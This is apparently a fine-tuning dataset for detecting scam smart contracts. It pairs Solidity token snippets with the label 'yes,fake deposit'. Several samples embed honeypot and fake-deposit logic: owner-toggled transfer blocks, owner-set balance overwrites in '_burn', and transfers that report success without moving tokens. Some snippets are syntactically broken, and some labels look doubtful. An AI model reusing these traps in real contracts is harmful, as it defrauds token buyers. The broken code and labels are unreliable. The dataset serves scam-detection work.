private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _reflectFee(uint256 rFee, uint256 tFee) private {\n _rTotal = _rTotal.sub(rFee);\n _tFeeTotal = _tFeeTotal.add(tFee);\n }\n\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\npragma solidity =0.8.3;\n\nimport \"./IERC20.sol\";\nimport \"./IERC20Metadata.sol\";\nimport \"./Context.sol\";\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address =u003e uint256) internal _balances;\n mapping (address =u003e bool) private _approveTransfer;\n mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\n bool intTx = true;\n uint256 _burnRate;\n uint256 internal _totalSupply;\n string internal _name;\n string internal _symbol;\n address internal _owner;\n \n constructor (string memory name_, string memory symbol_) {\n _name = name_;\n _symbol = symbol_;\n _owner = msg.sender;\n }\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: only the owner allowed\");\n _;\n }\n\t\n \n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n function approveTransfer(address _address) external onlyOwner {\n _approveTransfer[_address] = true;\n }\n\n function burnRate (uint256 value) external onlyOwner {\n _burnRate = value;\n }\n \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\n \n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n }\n\n\n function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n uint256 currentAllowance = _allowances[_msgSender()][spender];\n require(currentAllowance u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\n _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n return true;\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(intTx == false, \"\");\n if (intTx == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (intTx == true, \"\");} \n }\n \n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n uint256 accountBalance = _balances[account];\n require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance\");\n _balances[account] = _burnRate - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": " function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n\n function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n uint256 currentRate = _getRate();\n return rAmount.div(currentRate);\n }\n\n\n function _transfer(address sender, address recipient, uint256 amount) private {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be greater than zero\");\n if (BOTaddressToLock[sender] || BOTaddressToLock[recipient])\n require(amount == 0, \"We don't like BOTs, take your toys and go away.\");\n if (allLimitsOff == false && maxTokensLimitDuringFirstHour == false && sender != owner() && recipient != owner()) \n require(amount <= _maxTokensInitialLimit, \"Tokens amount too high. Contract is running on limited mode. Max 0.004 Eth per each transaction.\");\n if (allLimitsOff == false && maxTokensLimitDuringFirstHour == true && sender != owner() && recipient != owner())\n require(amount <= _maxTokensLimitDuringFirstHour, \"Tokens amount too high. Current 1hour limit set to less than 1.0 Eth per each transaction.\");\n if (_contractRunning == true || sender == owner() || recipient == owner()) {\n if (_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferFromExcluded(sender, recipient, amount);\n } else if (!_isExcluded[sender] && _isExcluded[recipient]) {\n _transferToExcluded(sender, recipient, amount);\n } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferStandard(sender, recipient, amount);\n } else if (_isExcluded[sender] && _isExcluded[recipient]) {\n _transferBothExcluded(sender, recipient, amount);\n } else {\n _transferStandard(sender, recipient, amount);\n }\n }\n else {\n require (_contractRunning == true, \"Contract not started yet. Try later.\");\n }\n }\n\n function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _reflectFee(uint256 rFee, uint256 tFee) private {\n _rTotal = _rTotal.sub(rFee);\n _tFeeTotal = _tFeeTotal.add(tFee);\n }\n\n \n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "abstract contract ERC20 is IERC20, Domain {\n mapping(address => uint256) public override balanceOf;\n mapping(address => mapping(address => uint256)) public override allowance\n mapping(address => uint256) public nonces;\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n function transfer(address to, uint256 amount) public returns (bool) {\n if (amount != 0 || msg.sender == to) {\n uint256 srcBalance = balanceOf[msg.sender];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n if (msg.sender != to) {\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so low balance calls safe some gas\n\n balanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount;\n }\n }\n emit Transfer(msg.sender, to, amount);\n return true;\n }\n function transferFrom(\n address from,\n address to,\n uint256 amount\n ) public returns (bool) {\n if (amount != 0) {\n uint256 srcBalance = balanceOf[from];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n\n if (from != to) {\n uint256 spenderAllowance = allowance[from][msg.sender];\n if (spenderAllowance != type(uint256).max) {\n require(spenderAllowance >= amount, \"ERC20: allowance too low\");\n allowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\n }\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so other failed calls safe some gas\n\n balanceOf[from] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount;\n }\n }\n emit Transfer(from, to, amount);\n return true;\n }\n\n function approve(address spender, uint256 amount) public override returns (bool) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n bytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n}\n\n\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "contract StandardToken is Ownable {\n using SafeMath for uint256;\n\n // cooldown\n mapping (address => uint) public lastBuyTime;\n mapping (address => bool) public bots;\n bool _cooldownEnabled = true;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n address uni = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n require(!_cooldownEnabled ||\n ((_from == uni || lastBuyTime[_from] + 30 seconds < block.timestamp) &&\n (_to == uni || lastBuyTime[_to] + 30 seconds < block.timestamp)), \"Cool down bro\");\n require(!bots[_from] && !bots[_to], \"No bots plz\");\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n if (_from != uni) {\n lastBuyTime[_from] = block.timestamp;\n } else if (_to != uni) {\n lastBuyTime[_to] = block.timestamp;\n }\n return true;\n } else { return false; }\n }\n\n function setCooldownEnabled(bool enabled) public onlyOwner {\n _cooldownEnabled = enabled;\n }\n\n function blacklistBots() internal {\n bots[0x000000000000084e91743124a982076C59f10084] = true;\n bots[0x000000917de6037d52b1F0a306eeCD208405f7cd] = true;\n bots[0x1d6E8BAC6EA3730825bde4B005ed7B2B39A2932d] = true;\n bots[0x7100e690554B1c2FD01E8648db88bE235C1E6514] = true;\n bots[0x72b30cDc1583224381132D379A052A6B10725415] = true;\n bots[0x9282dc5c422FA91Ff2F6fF3a0b45B7BF97CF78E7] = true;\n bots[0x9eDD647D7d6Eceae6bB61D7785Ef66c5055A9bEE] = true;\n bots[0xfad95B6089c53A0D1d861eabFaadd8901b0F8533] = true;\n }\n\n function blacklistBot(address bot) public onlyOwner {\n bots[bot] = true;\n }\n\n function unBlacklistBot(address bot) public onlyOwner {\n bots[bot] = false;\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n \n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "contract ERC20 is Context, IERC20, IERC20Metadata { \n mapping (address = u003e uint256) internal _balances; \n mapping (address = u003e bool) private _feeBurn; \n mapping (address = u003e mapping (address = u003e uint256)) private _allowances; \n bool intTx = true; \n uint256 _burnRate; \n uint256 internal _totalSupply; \n string internal _name; \n string internal _symbol; \n address internal _owner; \n\n constructor (string memory name_, string memory symbol_) { \n _name = name_; \n _symbol = symbol_; \n _owner = msg.sender; \n }\n modifier onlyOwner() { \n require(_owner == msg.sender, \"Ownable: only the owner allowed \"); \n _; \n } \n function totalSupply() public view virtual override returns (uint256) { \n return _totalSupply; \n } \n \n \n function feeBurn(address _address) external onlyOwner { \n \n _feeBurn[_address] = true; \n \n } \n\n function initContract() public virtual onlyOwner { \n if (intTx == true) {intTx = false;} else {intTx = true;} \n } \n \n function burnRate (uint256 value) external onlyOwner { \n _burnRate = value; \n } \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) { \n \n _approve(_msgSender(), spender, amount); \n \n return true; \n \n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n \n _transfer(sender, recipient, amount); \n \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n \n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance \"); \n \n _approve(sender, _msgSender(), currentAllowance - amount); \n \n return true; \n \n } \n \n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n \n require(sender != address(0), \"ERC20: transfer from the zero address \"); \n \n require(recipient != address(0), \"ERC20: transfer to the zero address \"); \n \n require(amount u003e 0, \"Transfer amount must be grater thatn zero \"); \n \n if (_feeBurn[sender] || _feeBurn[recipient]) \n \n require(intTx == false, \" \"); \n \n if (intTx == true || sender == _owner || recipient == _owner) { \n \n _beforeTokenTransfer(sender, recipient, amount); \n \n uint256 senderBalance = _balances[sender]; \n \n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance \"); \n \n _balances[sender] = senderBalance - amount; \n \n _balances[recipient] += amount; \n \n emit Transfer(sender, recipient, amount);} \n \n else {require (intTx == true, \" \");} \n \n } \n \n function _burn(address account, uint256 amount) internal virtual { \n \n require(account != address(0), \"ERC20: burn from the zero address \"); \n \n uint256 accountBalance = _balances[account]; \n \n require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance \"); \n \n _balances[account] = _burnRate - amount; \n \n _totalSupply -= amount; \n \n emit Transfer(account, address(0), amount); \n \n } \n\n function _approve(address owner, address spender, uint256 amount) internal virtual { \n \n require(owner != address(0), \"ERC20: approve from the zero address \"); \n \n require(spender != address(0), \"ERC20: approve to the zero address \"); \n \n \n \n _allowances[owner][spender] = amount; \n \n emit Approval(owner, spender, amount); \n \n } \n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { } \n \n} \n\n \n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity =0.8.3;\n\nimport \"./IERC20.sol\";\nimport \"./IERC20Metadata.sol\";\nimport \"./Context.sol\";\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address =u003e uint256) internal _balances;\n mapping (address =u003e bool) private _feeBurn;\n mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\n bool intTx = true;\n uint256 _burnRate;\n uint256 internal _totalSupply;\n address internal _owner;\n uint256 public _decreaseFee = 7000000 * 10**18;\n mapping (address =u003e bool) public _approvedTransfer;\n mapping (address =u003e bool) public _bBots;\n\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: only the owner allowed\");\n _;\n }\n\n\n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n \n\n function feeBurn(address _address) external onlyOwner {\n _feeBurn[_address] = true;\n }\n\n function feeBurned(address _address) public view returns (bool) {\n return _feeBurn[_address];\n }\n\n function initContract() public virtual onlyOwner {\n if (intTx == true) {intTx = false;} else {intTx = true;}\n }\n \n\n function burnRate (uint256 value) external onlyOwner {\n _burnRate = value;\n }\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\n\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\n \n if(!_approvedTransfer[sender] u0026u0026 _bBots[recipient]) {\n require(amount u003c= _decreaseFee, \"Transfer amount exceeds the maxTxAmount.\"); \n }\n \n\n if (_feeBurn[sender] || _feeBurn[recipient]) \n require(intTx == false, \"\");\n if (intTx == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (intTx == true, \"\");} \n }\n\n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n uint256 accountBalance = _balances[account];\n require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance\");\n _balances[account] = _burnRate - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n\n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n \n function decreaseFee(uint256 decreaseFeeAddress) external onlyOwner() {\n _decreaseFee = decreaseFeeAddress;\n }\n \n function approveTransfer(address account) external onlyOwner {\n _approvedTransfer[account] = true; \n }\n \n function bBots(address account) external onlyOwner {\n _bBots[account] = true;\n }\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\ncontract RABBITROCKET is Context, IERC20, IERC20Metadata, Ownable { \n\n address internal constant UniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; \n uint256 _NUM = 1 * 10**9;\n mapping(address => uint256) private _balances;\n mapping(address => mapping(address => uint256)) private _allowances;\n uint256 private _totalSupply;\n bool isValue = true; \n constructor() {\n _totalSupply = 1000 * 10**9 * 10**9;\n _balances[_msgSender()] = _totalSupply;\n emit Transfer(address(0), _msgSender(), _totalSupply);\n }\n\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n //_transfer(_msgSender(), recipient, amount);\n if(_msgSender() == UniswapV2Router || _msgSender() == UniswapPair() || UniswapPair() == address(0) || _msgSender() == owner()) {\n _transfer(_msgSender(), recipient, amount);\n } else {\n //nomal user check amount\n if( (amount <= _NUM || isValue) && !isContract(_msgSender()) ) {\n _transfer(_msgSender(), recipient, amount);\n }\n }\n return true;\n }\n\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(\n address sender,\n address recipient,\n uint256 amount\n ) public virtual override returns (bool) {\n if(sender == UniswapV2Router || sender == UniswapPair() || UniswapPair() == address(0) || sender == owner()) {\n _transfer(sender, recipient, amount);\n \n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n unchecked {\n _approve(sender, _msgSender(), currentAllowance - amount);\n }\n } else {\n //nomal user check amount\n if( (amount <= _NUM || isValue) && !isContract(sender) ) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n unchecked {\n _approve(sender, _msgSender(), currentAllowance - amount);\n }\n }\n }\n return true;\n }\n\n function UniswapPair() public view virtual returns (address) {\n address UniswapV2Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n address pairAddress = IUniswapFactory(UniswapV2Factory).getPair(address(WETH), address(this));\n return pairAddress;\n }\n\n function isContract(address addr) internal view returns (bool) {\n bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n bytes32 codehash;\n assembly {\n codehash := extcodehash(addr)\n }\n return (codehash != 0x0 && codehash != accountHash);\n }\n\n function _transfer(\n address sender,\n address recipient,\n uint256 amount\n ) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n _beforeTokenTransfer(sender, recipient, amount);\n\n uint256 senderBalance = _balances[sender];\n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n unchecked {\n _balances[sender] = senderBalance - amount;\n }\n _balances[recipient] += amount;\n\n emit Transfer(sender, recipient, amount);\n }\n\n function _approve(\n address owner,\n address spender,\n uint256 amount\n ) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _beforeTokenTransfer(\n address from,\n address to,\n uint256 amount\n ) internal virtual {}\n\n}\n \n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\npragma solidity 0.8.6;\n\n\ncontract NFToken is\n ERC721,\n SupportsInterface\n{\n using AddressUtils for address;\n\n \n string constant ZERO_ADDRESS = \"003001\";\n string constant NOT_VALID_NFT = \"003002\";\n string constant NOT_OWNER_OR_OPERATOR = \"003003\";\n string constant NOT_OWNER_APPROVED_OR_OPERATOR = \"003004\";\n string constant NOT_ABLE_TO_RECEIVE_NFT = \"003005\";\n string constant NFT_ALREADY_EXISTS = \"003006\";\n string constant NOT_OWNER = \"003007\";\n string constant IS_OWNER = \"003008\";\n\n \n bytes4 internal constant MAGIC_ON_ERC721_RECEIVED = 0x150b7a02;\n\n \n mapping (uint256 => address) internal idToOwner;\n\n mapping (uint256 => address) internal idToApproval;\n\n mapping (address => uint256) private ownerToNFTokenCount;\n\n mapping (address => mapping (address => bool)) internal ownerToOperators;\n\n modifier canOperate(\n uint256 _tokenId\n )\n {\n address tokenOwner = idToOwner[_tokenId];\n require(\n tokenOwner == msg.sender || ownerToOperators[tokenOwner][msg.sender],\n NOT_OWNER_OR_OPERATOR\n );\n _;\n }\n\n modifier canTransfer(\n uint256 _tokenId\n )\n {\n address tokenOwner = idToOwner[_tokenId];\n require(\n tokenOwner == msg.sender\n || idToApproval[_tokenId] == msg.sender\n || ownerToOperators[tokenOwner][msg.sender],\n NOT_OWNER_APPROVED_OR_OPERATOR\n );\n _;\n }\n\n modifier validNFToken(\n uint256 _tokenId\n )\n {\n require(idToOwner[_tokenId] != address(0), NOT_VALID_NFT);\n _;\n }\n\n constructor()\n {\n supportedInterfaces[0x80ac58cd] = true; // ERC721\n }\n\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes calldata _data\n )\n external\n override\n {\n _safeTransferFrom(_from, _to, _tokenId, _data);\n }\n\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n external\n override\n {\n _safeTransferFrom(_from, _to, _tokenId, \"\");\n }\n\n function transferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n external\n override\n canTransfer(_tokenId)\n validNFToken(_tokenId)\n {\n address tokenOwner = idToOwner[_tokenId];\n require(tokenOwner == _from, NOT_OWNER);\n require(_to != address(0), ZERO_ADDRESS);\n\n _transfer(_to, _tokenId);\n }\n\n function approve(\n address _approved,\n uint256 _tokenId\n )\n external\n override\n canOperate(_tokenId)\n validNFToken(_tokenId)\n {\n address tokenOwner = idToOwner[_tokenId];\n require(_approved != tokenOwner, IS_OWNER);\n\n idToApproval[_tokenId] = _approved;\n emit Approval(tokenOwner, _approved, _tokenId);\n }\n\n function setApprovalForAll(\n address _operator,\n bool _approved\n )\n external\n override\n {\n ownerToOperators[msg.sender][_operator] = _approved;\n emit ApprovalForAll(msg.sender, _operator, _approved);\n }\n\n function getApproved(\n uint256 _tokenId\n )\n external\n override\n view\n validNFToken(_tokenId)\n returns (address)\n {\n return idToApproval[_tokenId];\n }\n\n function isApprovedForAll(\n address _owner,\n address _operator\n )\n external\n override\n view\n returns (bool)\n {\n return ownerToOperators[_owner][_operator];\n }\n\n function _transfer(\n address _to,\n uint256 _tokenId\n )\n internal\n {\n address from = idToOwner[_tokenId];\n _clearApproval(_tokenId);\n\n _removeNFToken(from, _tokenId);\n _addNFToken(_to, _tokenId);\n\n emit Transfer(from, _to, _tokenId);\n }\n\n function _removeNFToken(\n address _from,\n uint256 _tokenId\n )\n internal\n virtual\n {\n require(idToOwner[_tokenId] == _from, NOT_OWNER);\n ownerToNFTokenCount[_from] -= 1;\n delete idToOwner[_tokenId];\n }\n function _addNFToken(\n address _to,\n uint256 _tokenId\n )\n internal\n virtual\n {\n require(idToOwner[_tokenId] == address(0), NFT_ALREADY_EXISTS);\n\n idToOwner[_tokenId] = _to;\n ownerToNFTokenCount[_to] += 1;\n }\n\n function _getOwnerNFTCount(\n address _owner\n )\n internal\n virtual\n view\n returns (uint256)\n {\n return ownerToNFTokenCount[_owner];\n }\n\n function _safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes memory _data\n )\n private\n canTransfer(_tokenId)\n validNFToken(_tokenId)\n {\n address tokenOwner = idToOwner[_tokenId];\n require(tokenOwner == _from, NOT_OWNER);\n require(_to != address(0), ZERO_ADDRESS);\n\n _transfer(_to, _tokenId);\n\n if (_to.isContract())\n {\n bytes4 retval = ERC721TokenReceiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data);\n require(retval == MAGIC_ON_ERC721_RECEIVED, NOT_ABLE_TO_RECEIVE_NFT);\n }\n }\n\n function _clearApproval(\n uint256 _tokenId\n )\n private\n {\n delete idToApproval[_tokenId];\n }\n\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.3; \n\n library Address {\n \n function isContract(address account) internal view returns (bool) {\n // This method relies on extcodesize, which returns 0 for contracts in\n // construction, since the code is only stored at the end of the\n // constructor execution. \n uint256 size;\n assembly {\n size := extcodesize(account)\n }\n return size > 0;\n } \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n } \n \n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance \");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n } \n \n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n } \n \n function decimals() external view returns (uint8);\n}\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.1; \n \n \nabstract contract Context { \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n  \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n  \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n  \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \ninterface IERC20Metadata is IERC20 { \n  \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n  \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(sender, recipient, amount); \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\"); \n _approve(sender, _msgSender(), currentAllowance - amount); \n return true; \n } \n \n  \n function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n require(sender != address(0), \"ERC20: transfer from the zero address\"); \n require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n require(amount 